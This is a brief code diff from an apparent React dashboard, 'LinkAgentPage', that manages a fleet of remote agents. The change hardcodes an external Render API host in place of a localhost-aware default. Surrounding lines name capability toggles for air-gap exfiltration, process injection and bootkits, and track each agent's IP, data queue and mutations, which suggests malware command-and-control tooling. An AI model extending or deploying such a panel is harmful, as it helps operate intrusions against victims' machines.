@@ -27,7 +27,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
     airgapExfil: false, processInject: false, bootkit: false,
   });
 
-  const API_BASE = window.location.hostname !== "localhost" ? "/v1" : "http://localhost:3000/v1";
+  const API_BASE = "https://bixtx.onrender.com/v1";
 
   type FleetAgent = { id: string; device: string; os: OS; ip: string; version: string; status: string; lastPing: string; dataQueue: string; mutations: number };
   const [FLEET, setFLEET] = useState<FleetAgent[]>([]);
